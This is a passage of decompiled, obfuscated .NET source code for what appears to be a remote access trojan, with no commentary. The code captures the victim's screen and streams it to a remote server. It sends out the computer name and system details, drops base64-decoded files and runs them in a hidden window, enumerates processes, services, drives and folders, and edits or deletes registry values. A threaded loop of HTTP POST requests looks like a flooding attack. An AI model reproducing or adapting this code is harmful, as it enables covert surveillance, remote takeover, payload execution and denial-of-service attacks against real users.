			item = new Rectangle((int)Math.Round((double)rectangle_0.Width / 4.0), (int)Math.Round((double)rectangle_0.Height / 4.0), Y3xeVwuMS5vJkK0ZGIEYFqD3169, sJao3S1JaBUm8NOa587FYNGH170);
			list6.Add(item);
			List<Rectangle> list7 = jEuudDaxptLbm6I03MzJQDQS171;
			item = new Rectangle((int)Math.Round((double)rectangle_0.Width / 4.0 + (double)(Y3xeVwuMS5vJkK0ZGIEYFqD3169 * 1)), (int)Math.Round((double)rectangle_0.Height / 4.0), Y3xeVwuMS5vJkK0ZGIEYFqD3169, sJao3S1JaBUm8NOa587FYNGH170);
			list7.Add(item);
			List<Rectangle> list8 = jEuudDaxptLbm6I03MzJQDQS171;
			item = new Rectangle((int)Math.Round((double)rectangle_0.Width / 4.0 + (double)(Y3xeVwuMS5vJkK0ZGIEYFqD3169 * 2)), (int)Math.Round((double)rectangle_0.Height / 4.0), Y3xeVwuMS5vJkK0ZGIEYFqD3169, sJao3S1JaBUm8NOa587FYNGH170);
			list8.Add(item);
			List<Rectangle> list9 = jEuudDaxptLbm6I03MzJQDQS171;
			item = new Rectangle(0, (int)Math.Round((double)rectangle_0.Height / 4.0 + (double)(sJao3S1JaBUm8NOa587FYNGH170 * 1)), Y3xeVwuMS5vJkK0ZGIEYFqD3169, sJao3S1JaBUm8NOa587FYNGH170);
			list9.Add(item);
			List<Rectangle> list10 = jEuudDaxptLbm6I03MzJQDQS171;
			item = new Rectangle((int)Math.Round((double)rectangle_0.Width / 4.0), (int)Math.Round((double)rectangle_0.Height / 4.0 + (double)(sJao3S1JaBUm8NOa587FYNGH170 * 1)), Y3xeVwuMS5vJkK0ZGIEYFqD3169, sJao3S1JaBUm8NOa587FYNGH170);
			list10.Add(item);
			List<Rectangle> list11 = jEuudDaxptLbm6I03MzJQDQS171;
			item = new Rectangle((int)Math.Round((double)rectangle_0.Width / 4.0 + (double)(Y3xeVwuMS5vJkK0ZGIEYFqD3169 * 1)), (int)Math.Round((double)rectangle_0.Height / 4.0 + (double)(sJao3S1JaBUm8NOa587FYNGH170 * 1)), Y3xeVwuMS5vJkK0ZGIEYFqD3169, sJao3S1JaBUm8NOa587FYNGH170);
			list11.Add(item);
			List<Rectangle> list12 = jEuudDaxptLbm6I03MzJQDQS171;
			item = new Rectangle((int)Math.Round((double)rectangle_0.Width / 4.0 + (double)(Y3xeVwuMS5vJkK0ZGIEYFqD3169 * 2)), (int)Math.Round((double)rectangle_0.Height / 4.0 + (double)(sJao3S1JaBUm8NOa587FYNGH170 * 1)), Y3xeVwuMS5vJkK0ZGIEYFqD3169, sJao3S1JaBUm8NOa587FYNGH170);
			list12.Add(item);
			List<Rectangle> list13 = jEuudDaxptLbm6I03MzJQDQS171;
			item = new Rectangle(0, (int)Math.Round((double)rectangle_0.Height / 4.0 + (double)(sJao3S1JaBUm8NOa587FYNGH170 * 2)), Y3xeVwuMS5vJkK0ZGIEYFqD3169, sJao3S1JaBUm8NOa587FYNGH170);
			list13.Add(item);
			List<Rectangle> list14 = jEuudDaxptLbm6I03MzJQDQS171;
			item = new Rectangle((int)Math.Round((double)rectangle_0.Width / 4.0), (int)Math.Round((double)rectangle_0.Height / 4.0 + (double)(sJao3S1JaBUm8NOa587FYNGH170 * 2)), Y3xeVwuMS5vJkK0ZGIEYFqD3169, sJao3S1JaBUm8NOa587FYNGH170);
			list14.Add(item);
			List<Rectangle> list15 = jEuudDaxptLbm6I03MzJQDQS171;
			item = new Rectangle((int)Math.Round((double)rectangle_0.Width / 4.0 + (double)(Y3xeVwuMS5vJkK0ZGIEYFqD3169 * 1)), (int)Math.Round((double)rectangle_0.Height / 4.0 + (double)(sJao3S1JaBUm8NOa587FYNGH170 * 2)), Y3xeVwuMS5vJkK0ZGIEYFqD3169, sJao3S1JaBUm8NOa587FYNGH170);
			list15.Add(item);
			List<Rectangle> list16 = jEuudDaxptLbm6I03MzJQDQS171;
			item = new Rectangle((int)Math.Round((double)rectangle_0.Width / 4.0 + (double)(Y3xeVwuMS5vJkK0ZGIEYFqD3169 * 2)), (int)Math.Round((double)rectangle_0.Height / 4.0 + (double)(sJao3S1JaBUm8NOa587FYNGH170 * 2)), Y3xeVwuMS5vJkK0ZGIEYFqD3169, sJao3S1JaBUm8NOa587FYNGH170);
			list16.Add(item);
		}
	}

	private void uBLzQOJs9uiNAxMY152(object Tempdata)
	{
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Expected O, but got Unknown
		//IL_00dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e3: Expected O, but got Unknown
		try
		{
			while (JoqCFjt3QDGVdW14)
			{
				try
				{
					string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¦" }, (string[])null, (Type[])null, (bool[])null);
					string text = null;
					EncoderParameters val = new EncoderParameters(1);
					val.get_Param()[0] = new EncoderParameter(Encoder.Quality, (long)int.Parse(array[0]));
					ImageCodecInfo val2 = BckQMcCJXq3vz1L106("image/jpeg");
					Bitmap val3 = new Bitmap(rectangle_0.Width, rectangle_0.Height, (PixelFormat)135173);
					checked
					{
						Y3xeVwuMS5vJkK0ZGIEYFqD3169 = (int)Math.Round((double)rectangle_0.Width / 4.0);
						sJao3S1JaBUm8NOa587FYNGH170 = (int)Math.Round((double)rectangle_0.Height / 4.0);
						Bitmap val4 = new Bitmap(Y3xeVwuMS5vJkK0ZGIEYFqD3169, sJao3S1JaBUm8NOa587FYNGH170, (PixelFormat)135173);
						Size size = new Size(Y3xeVwuMS5vJkK0ZGIEYFqD3169, sJao3S1JaBUm8NOa587FYNGH170);
						Graphics val5 = Graphics.FromImage((Image)(object)val3);
						val5.CopyFromScreen(rectangle_0.X, rectangle_0.Y, 0, 0, rectangle_0.Size, (CopyPixelOperation)13369376);
						int num = 0;
						do
						{
							try
							{
								Bitmap val6 = val3.Clone(jEuudDaxptLbm6I03MzJQDQS171[num], (PixelFormat)135173);
								val5 = Graphics.FromImage((Image)(object)val4);
								val5.set_InterpolationMode((InterpolationMode)7);
								val5.set_CompositingQuality((CompositingQuality)2);
								val5.DrawImage((Image)(object)val6, 0, 0, Y3xeVwuMS5vJkK0ZGIEYFqD3169, sJao3S1JaBUm8NOa587FYNGH170);
								MemoryStream memoryStream = new MemoryStream();
								if (Conversions.ToDouble(array[0]) > 75.0)
								{
									((Image)val4).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
								}
								else
								{
									((Image)val4).Save((Stream)memoryStream, val2, val);
								}
								memoryStream.Capacity = (int)memoryStream.Length;
								try
								{
									if (num < 10)
									{
										p7BbeXRGOCzIKDero67S1kCv173 = "0" + Conversions.ToString(num);
									}
									else
									{
										p7BbeXRGOCzIKDero67S1kCv173 = Conversions.ToString(num);
									}
									if (memoryStream.Length != UuTxiY5F3t4onxwwrmXE2DOY172[num])
									{
										byte[] buffer = memoryStream.GetBuffer();
										text = Convert.ToBase64String(buffer);
										buffer = null;
										try
										{
											ETktHEpgZ7Zsm1rVyVI3Bn70.WriteLine("/STARTSE0/" + p7BbeXRGOCzIKDero67S1kCv173 + text);
											ETktHEpgZ7Zsm1rVyVI3Bn70.Flush();
										}
										catch (Exception projectError)
										{
											ProjectData.SetProjectError(projectError);
											ProjectData.ClearProjectError();
											return;
										}
										g3htGcQhGU8bmTq5CnALXNLO174++;
									}
								}
								catch (Exception projectError2)
								{
									ProjectData.SetProjectError(projectError2);
									ProjectData.ClearProjectError();
								}
								UuTxiY5F3t4onxwwrmXE2DOY172[num] = (int)memoryStream.Length;
								memoryStream.Dispose();
								memoryStream.Close();
							}
							catch (Exception projectError3)
							{
								ProjectData.SetProjectError(projectError3);
								ProjectData.ClearProjectError();
							}
							num++;
						}
						while (num <= 15);
						((Image)val4).Dispose();
						((Image)val3).Dispose();
						val5.Dispose();
						GC.Collect();
						text = null;
						try
						{
							ETktHEpgZ7Zsm1rVyVI3Bn70.WriteLine("/STARTSET/");
							ETktHEpgZ7Zsm1rVyVI3Bn70.Flush();
							break;
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
							break;
						}
					}
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					Thread.Sleep(100);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
	}

	private void guo87eVbFAVp1tQA153(object Tempdata)
	{
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Expected O, but got Unknown
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
			try
			{
				while (JoqCFjt3QDGVdW14)
				{
					try
					{
						string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¦" }, (string[])null, (Type[])null, (bool[])null);
						string text = null;
						EncoderParameters val = new EncoderParameters(1);
						val.get_Param()[0] = new EncoderParameter(Encoder.Quality, (long)int.Parse(array[0]));
						ImageCodecInfo val2 = BckQMcCJXq3vz1L106("image/jpeg");
						Bitmap val3 = new Bitmap(rectangle_0.Width, rectangle_0.Height, (PixelFormat)135173);
						Y3xeVwuMS5vJkK0ZGIEYFqD3169 = rectangle_0.Width;
						sJao3S1JaBUm8NOa587FYNGH170 = rectangle_0.Height;
						new Bitmap(Y3xeVwuMS5vJkK0ZGIEYFqD3169, sJao3S1JaBUm8NOa587FYNGH170, (PixelFormat)135173);
						Size size = new Size(Y3xeVwuMS5vJkK0ZGIEYFqD3169, sJao3S1JaBUm8NOa587FYNGH170);
						Graphics val4 = Graphics.FromImage((Image)(object)val3);
						val4.CopyFromScreen(rectangle_0.X, rectangle_0.Y, 0, 0, rectangle_0.Size, (CopyPixelOperation)13369376);
						MemoryStream memoryStream = new MemoryStream();
						if (Conversions.ToDouble(array[0]) > 75.0)
						{
							((Image)val3).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
						}
						else
						{
							((Image)val3).Save((Stream)memoryStream, val2, val);
						}
						checked
						{
							memoryStream.Capacity = (int)memoryStream.Length;
							if (memoryStream.Length == int_1)
							{
								try
								{
									ETktHEpgZ7Zsm1rVyVI3Bn70.WriteLine("/STARTSEQ/SAME");
									ETktHEpgZ7Zsm1rVyVI3Bn70.Flush();
								}
								catch (Exception projectError)
								{
									ProjectData.SetProjectError(projectError);
									ProjectData.ClearProjectError();
									break;
								}
							}
							else
							{
								byte[] buffer = memoryStream.GetBuffer();
								text = Convert.ToBase64String(buffer);
								buffer = null;
								try
								{
									ETktHEpgZ7Zsm1rVyVI3Bn70.WriteLine("/STARTSEQ/" + text);
									ETktHEpgZ7Zsm1rVyVI3Bn70.Flush();
								}
								catch (Exception projectError2)
								{
									ProjectData.SetProjectError(projectError2);
									ProjectData.ClearProjectError();
									break;
								}
							}
							int_1 = (int)memoryStream.Length;
							memoryStream.Dispose();
							memoryStream.Close();
						}
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						Thread.Sleep(100);
						ProjectData.ClearProjectError();
						continue;
					}
					GC.Collect();
					break;
				}
				break;
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				Thread.Sleep(100);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void cmIvW9Ua8HAwekAl154(object Tempdata)
	{
		int num = 0;
		do
		{
			try
			{
				if (!F2gDJRyshtl9WULKX3GhYfpe176)
				{
					break;
				}
				Type typeFromHandle = typeof(WebRequest);
				object[] array = new object[1] { RuntimeHelpers.GetObjectValue(Tempdata) };
				bool[] array2 = new bool[1] { true };
				object obj = NewLateBinding.LateGet((object)null, typeFromHandle, "Create", array, (string[])null, (Type[])null, array2);
				if (array2[0])
				{
					Tempdata = RuntimeHelpers.GetObjectValue(array[0]);
				}
				HttpWebRequest httpWebRequest = (HttpWebRequest)obj;
				byte[] bytes = Encoding.UTF8.GetBytes("Hello");
				HttpWebRequest httpWebRequest2 = httpWebRequest;
				httpWebRequest2.Method = "POST";
				httpWebRequest2.ContentType = "application/x-www-form-urlencoded";
				httpWebRequest2.ContentLength = bytes.Length;
				httpWebRequest2.UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)";
				httpWebRequest2.Referer = "http://0mn3d6yunkn0wn.com";
				httpWebRequest2 = null;
				Stream requestStream = httpWebRequest.GetRequestStream();
				Stream stream = requestStream;
				stream.Write(bytes, 0, bytes.Length);
				stream.Close();
				stream = null;
				requestStream = null;
				HttpWebResponse httpWebResponse = null;
				try
				{
					httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				}
				catch (WebException projectError)
				{
					ProjectData.SetProjectError((Exception)projectError);
					ProjectData.ClearProjectError();
				}
				Stream responseStream = httpWebResponse.GetResponseStream();
				StreamReader streamReader = new StreamReader(responseStream);
				streamReader.ReadToEnd();
				streamReader.Close();
				responseStream.Close();
				httpWebResponse.Close();
				httpWebRequest = null;
				httpWebResponse = null;
				responseStream = null;
				streamReader = null;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			num = checked(num + 1);
		}
		while (num <= 100);
	}

	private void TYTpXRjgFAUfTkqG155(object Tempdata)
	{
		F2gDJRyshtl9WULKX3GhYfpe176 = true;
		int num = 0;
		while (F2gDJRyshtl9WULKX3GhYfpe176)
		{
			Thread thread = new Thread(cmIvW9Ua8HAwekAl154);
			thread.Start(RuntimeHelpers.GetObjectValue(Tempdata));
			num = checked(num + 1);
			if (num > 100)
			{
				break;
			}
		}
	}

	private void EHBePh26Ad0pDpXk156()
	{
		try
		{
			ay4XZJzuPkg0e8e8E158 = new TcpClient();
			ay4XZJzuPkg0e8e8E158.Connect(nZZEKWj4rLgtFjmCxsUb2QER177, wiSrmNwqC1gJSTHkagHbEi5E178);
			As4aCsOgnxECTkTsL159 = ay4XZJzuPkg0e8e8E158.GetStream();
			fvcvSLsfU05qZicmS160 = new StreamWriter(As4aCsOgnxECTkTsL159);
			Uy9dyer0GtLrYJth15aHD49 uy9dyer0GtLrYJth15aHD = new Uy9dyer0GtLrYJth15aHD49();
			string text = uy9dyer0GtLrYJth15aHD.EMZImrCIASuVVPcH8a30X225();
			string text2 = uy9dyer0GtLrYJth15aHD.xrEPAT3u237();
			string text3 = uy9dyer0GtLrYJth15aHD.bbCNCZehwP7j3qzCJvdXq226();
			string text4 = uy9dyer0GtLrYJth15aHD.VJror43m229();
			string text5 = uy9dyer0GtLrYJth15aHD.YfOLMyZi233();
			string text6 = uy9dyer0GtLrYJth15aHD.cYqKGw99234();
			string text7 = uy9dyer0GtLrYJth15aHD.BRpC4oFP230();
			string text8 = uy9dyer0GtLrYJth15aHD.KU9cEE59235();
			string text9 = uy9dyer0GtLrYJth15aHD.Jyko6C0t236();
			string text10 = uy9dyer0GtLrYJth15aHD.xvJhkfcx238();
			string text11 = uy9dyer0GtLrYJth15aHD.a2ACh0VKx0lrgBiOneAYE217();
			object obj = text10 + text + text2 + text3 + text4 + text5 + text6 + text7 + text8 + text9 + text11;
			fvcvSLsfU05qZicmS160.WriteLine("/TRYPAAAA/" + ((ServerComputer)RWfjxtEPH2.Computer).get_Name() + "¦" + A4MHFmQw3DUU112(Conversions.ToString(obj), "&%#@?,:*"));
			fvcvSLsfU05qZicmS160.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_7(object Tempdata)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¦" }, (string[])null, (Type[])null, (bool[])null);
			if (Conversions.ToDouble(array[1]) == 1.0)
			{
				Process.Start(array[0]);
				return;
			}
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(array[0]);
			byte[] bytes = Encoding.UTF8.GetBytes("Hello");
			HttpWebRequest httpWebRequest2 = httpWebRequest;
			httpWebRequest2.Method = "POST";
			httpWebRequest2.ContentType = "application/x-www-form-urlencoded";
			httpWebRequest2.ContentLength = bytes.Length;
			httpWebRequest2.UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)";
			httpWebRequest2 = null;
			Stream requestStream = httpWebRequest.GetRequestStream();
			Stream stream = requestStream;
			stream.Write(bytes, 0, bytes.Length);
			stream.Close();
			stream = null;
			requestStream = null;
			HttpWebResponse httpWebResponse = null;
			try
			{
				httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			}
			catch (WebException projectError)
			{
				ProjectData.SetProjectError((Exception)projectError);
				ProjectData.ClearProjectError();
			}
			Stream responseStream = httpWebResponse.GetResponseStream();
			StreamReader streamReader = new StreamReader(responseStream);
			streamReader.ReadToEnd();
			streamReader.Close();
			responseStream.Close();
			httpWebResponse.Close();
			httpWebRequest = null;
			httpWebResponse = null;
			responseStream = null;
			streamReader = null;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void gURwJlwCVMPKQTCg158()
	{
		F2gDJRyshtl9WULKX3GhYfpe176 = false;
	}

	private void CzfjPn6e4gbmsGRUWc9JxqB159(object temp)
	{
		try
		{
			TcpClient tcpClient = new TcpClient();
			tcpClient.Connect(nZZEKWj4rLgtFjmCxsUb2QER177, wiSrmNwqC1gJSTHkagHbEi5E178);
			NetworkStream stream = tcpClient.GetStream();
			StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.WriteLine(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"/TRYAVVVV/", temp), (object)"¦"), (object)uh57vDeLLFGedW6104()));
			streamWriter.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void E2T8NASu9QyJGpYYTODstaa160(object Tempdata)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "*" }, (string[])null, (Type[])null, (bool[])null);
			string text = array.GetValue(1)!.ToString();
			string text2 = array.GetValue(0)!.ToString();
			if (Operators.CompareString(text2, "temp", false) == 0)
			{
				text2 = Path.GetTempPath();
			}
			if (!Directory.Exists(text2))
			{
				Directory.CreateDirectory(text2);
			}
			if (!File.Exists(text2 + text))
			{
				byte[] array2 = Convert.FromBase64String(Conversions.ToString(array.GetValue(2)));
				((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().WriteAllBytes(text2 + text, array2, false);
				method_6(5);
			}
			string text3 = Conversions.ToString(array.GetValue(3));
			if (Operators.CompareString(text3, "0", false) == 0)
			{
				Process process = new Process();
				process.StartInfo.WorkingDirectory = text2;
				process.StartInfo.FileName = text2 + text;
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
			}
			else
			{
				Process process2 = new Process();
				process2.StartInfo.WorkingDirectory = text2;
				process2.StartInfo.FileName = text2 + text;
				process2.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
				process2.Start();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_8()
	{
		try
		{
			GP04RkhRarmzrCZrgohc135.WriteLine("/LISTPROC/" + method_4());
			GP04RkhRarmzrCZrgohc135.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void avXefVTY8tSJTRF4QpXPxIO162()
	{
		try
		{
			ltNxzNounuW7uMDzwdfc140.WriteLine("/LISTSERV/" + gmaOsGBLEQgt118());
			ltNxzNounuW7uMDzwdfc140.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void G2EvZgH8EghKpQquXPdP7pc163(object swfm)
	{
		try
		{
			string text = null;
			text = SGK2F88baxCC121();
			NewLateBinding.LateCall(swfm, (Type)null, "WriteLine", new object[1] { "/LISTDRVS/" + text }, (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(swfm, (Type)null, "Flush", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void lqX6VCy3prHhbBqTIqldsB7164(object Tempdata)
	{
		try
		{
			string text = null;
			string text2 = null;
			DirectoryInfo directoryInfo = new DirectoryInfo(Conversions.ToString(Tempdata));
			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(Tempdata, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)3, false))
			{
				text2 = "(DIR).*(DIR)..*";
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				text = "(DIR)" + directoryInfo2.get_Name();
				text2 = text2 + text + "*";
			}
			FileInfo[] files = directoryInfo.GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				text = fileInfo.get_Name();
				text2 = text2 + text + "*";
			}
			J580cztlCh0prHvvQRNdyH80.WriteLine("/ONLYONEP/" + text2);
			J580cztlCh0prHvvQRNdyH80.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			J580cztlCh0prHvvQRNdyH80.WriteLine("/ERRORDIR/(DIR).*(DIR)..");
			J580cztlCh0prHvvQRNdyH80.Flush();
			ProjectData.ClearProjectError();
		}
	}

	private void geqUZ0kTHhQi429Mw5cSjIz165(object Node)
	{
		string text = null;
		string[] array = null;
		try
		{
			if (Operators.ConditionalCompareObjectEqual(Node, (object)"CU", false))
			{
				array = Registry.CurrentUser.GetSubKeyNames();
			}
			else if (Operators.ConditionalCompareObjectEqual(Node, (object)"LM", false))
			{
				array = Registry.LocalMachine.GetSubKeyNames();
			}
			else if (Operators.ConditionalCompareObjectEqual(Node, (object)"US", false))
			{
				array = Registry.Users.GetSubKeyNames();
			}
			string[] array2 = array;
			foreach (string text2 in array2)
			{
				try
				{
					text = ((Operators.CompareString(text, (string)null, false) != 0) ? (text + "¥" + text2) : text2);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			ZHanOQKSlcRbYla7M150.WriteLine(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"/REGYVIEW/", Node), (object)text));
			ZHanOQKSlcRbYla7M150.Flush();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void eSxVvoMbJJjHSvHy35yZZki166(object Node)
	{
		try
		{
			string text = null;
			string[] array = null;
			object obj = Strings.Mid(Conversions.ToString(Node), 3, Strings.Len(RuntimeHelpers.GetObjectValue(Node)));
			Node = Strings.Left(Conversions.ToString(Node), 2);
			object obj2 = Node;
			if (Operators.ConditionalCompareObjectEqual(obj2, (object)"CU", false))
			{
				array = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj))!.GetSubKeyNames();
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"LM", false))
			{
				array = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj))!.GetSubKeyNames();
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"US", false))
			{
				array = Registry.Users.OpenSubKey(Conversions.ToString(obj))!.GetSubKeyNames();
			}
			string[] array2 = array;
			foreach (string text2 in array2)
			{
				try
				{
					text = ((Operators.CompareString(text, (string)null, false) != 0) ? (text + "¥" + text2) : text2);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(text, (string)null, false) != 0)
			{
				ZHanOQKSlcRbYla7M150.WriteLine("/REGVIEWS/" + text);
				ZHanOQKSlcRbYla7M150.Flush();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void lRyDO7gJNxFb1s4OuV67zKk167(object Node)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Node, (Type)null, "Split", new object[1] { "§" }, (string[])null, (Type[])null, (bool[])null);
			object obj = Strings.Mid(array[0], 3, Strings.Len(array[0]));
			Node = Strings.Left(array[0], 2);
			RegistryKey registryKey = null;
			object obj2 = Node;
			if (Operators.ConditionalCompareObjectEqual(obj2, (object)"CU", false))
			{
				registryKey = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"LM", false))
			{
				registryKey = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"US", false))
			{
				registryKey = Registry.Users.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			string[] array2 = array[1].Split(new char[1] { '¦' });
			registryKey.SetValue(array2[0], array2[1]);
			method_9(Operators.ConcatenateObject(Node, obj));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void hhPx8NLIzUAb3WKX3s0w9cj168(object Node)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Node, (Type)null, "Split", new object[1] { "§" }, (string[])null, (Type[])null, (bool[])null);
			object obj = Strings.Mid(array[0], 3, Strings.Len(array[0]));
			Node = Strings.Left(array[0], 2);
			RegistryKey registryKey = null;
			object obj2 = Node;
			if (Operators.ConditionalCompareObjectEqual(obj2, (object)"CU", false))
			{
				registryKey = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"LM", false))
			{
				registryKey = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"US", false))
			{
				registryKey = Registry.Users.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			registryKey.DeleteValue(array[1], throwOnMissingValue: false);
			method_9(Operators.ConcatenateObject(Node, obj));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void F6Zg34ScJBxhmYA7V2P5hrg169(object Node)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Node, (Type)null, "Split", new object[1] { "§" }, (string[])null, (Type[])null, (bool[])null);
			object obj = Strings.Mid(array[0], 3, Strings.Len(array[0]));
			Node = Strings.Left(array[0], 2);
			RegistryKey registryKey = null;
			object obj2 = Node;
			if (Operators.ConditionalCompareObjectEqual(obj2, (object)"CU", false))
			{
				registryKey = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"LM", false))
			{
				registryKey = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"US", false))
			{
				registryKey = Registry.Users.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			string[] array2 = array[1].Split(new char[1] { '╫' });
			string[] array3 = array2[0].Split(new char[1] { '¦' });
			string[] array4 = array2[1].Split(new char[1] { '¦' });
			registryKey.DeleteValue(array4[0], throwOnMissingValue: false);
			registryKey.SetValue(array3[0], array3[1]);
			method_9(Operators.ConcatenateObject(Node, obj));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_9(object Node)
	{
		try
		{
			string text = null;
			string[] array = null;
			object obj = Strings.Mid(Conversions.ToString(Node), 3, Strings.Len(RuntimeHelpers.GetObjectValue(Node)));
			Node = Strings.Left(Conversions.ToString(Node), 2);
			RegistryKey registryKey = null;
			object obj2 = Node;
			if (Operators.ConditionalCompareObjectEqual(obj2, (object)"CU", false))
			{
				array = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj))!.GetValueNames();
				registryKey = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj));
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"LM", false))
			{
				array = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj))!.GetValueNames();
				registryKey = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj));
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"US", false))
			{
				array = Registry.Users.OpenSubKey(Conversions.ToString(obj))!.GetValueNames();
				registryKey = Registry.Users.OpenSubKey(Conversions.ToString(obj));
			}
			if (array.Length <= 0)
			{
				return;
			}
			string[] array2 = array;
			foreach (object obj3 in array2)
			{
				object objectValue = RuntimeHelpers.GetObjectValue(registryKey.GetValue(Conversions.ToString(obj3)));
				if (objectValue == null)
				{
					continue;
				}
				object objectValue2 = RuntimeHelpers.GetObjectValue(objectValue);
				string text2 = null;
				try
				{
					if ((object)objectValue2.GetType() == typeof(byte[]))
					{
						text2 = Convert.ToBase64String((byte[])objectValue2) + "bytearraystring";
					}
					else
					{
						Encoding uTF = Encoding.UTF8;
						object[] array3 = new object[1] { RuntimeHelpers.GetObjectValue(objectValue2) };
						bool[] array4 = new bool[1] { true };
